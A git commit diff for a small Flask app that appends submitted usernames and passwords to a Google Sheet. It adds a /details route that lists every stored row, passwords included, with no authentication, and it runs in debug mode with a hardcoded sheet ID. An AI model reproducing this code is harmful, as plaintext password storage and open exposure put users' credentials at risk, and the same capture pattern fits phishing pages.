c886dde0b105f238b283bc0fda127dbea6597cd4
kaja-moideen <kajamoideen3100@gmail.com>
2024-09-27 15:49:56 +0530

    "Updated Flask app to use new credential file, added two new routes (/details and /file), and refactored index.html template with Tailwind CSS."

--- flask/app.py
+++ flask/app.py
@@ -6,7 +6,7 @@ import json
 app = Flask(__name__)
 
 # Load credentials from JSON key file
-with open('credential.json', 'r') as f:
+with open('Google-Credential.json', 'r') as f:
     credentials_json = json.load(f)
 
 # Set up credentials and scope for Google Sheets API
@@ -17,7 +17,7 @@ credentials = ServiceAccountCredentials.from_json_keyfile_dict(credentials_json,
 client = gspread.authorize(credentials)
 
 # Open the spreadsheet by its ID
-spreadsheet_id = 'your sheet id'
+spreadsheet_id = '1z8NvgPlAcvr9olTV9a80vGFRci4A_t3oin_POQk7MVo'
 sheet = client.open_by_key(spreadsheet_id).sheet1
 
 @app.route('/', methods=['GET', 'POST'])
@@ -28,6 +28,19 @@ def index():
         sheet.append_row([username, password])
         return redirect(url_for('index'))
     return render_template('index.html')
+
+@app.route('/details',methods=['GET','POST'])
+def details():
+    if request.method == 'GET':
+        formValue = sheet.get_all_values()
+        print(formValue)
+        return render_template('details.html',formValue=formValue)
+    
+    return "<h1>Get Method Not Working<h1>"
+
+@app.route('/file',methods=['GET','POST'])
+def file():
+    return 'file'
 
 if __name__ == '__main__':
     app.run(debug=True)
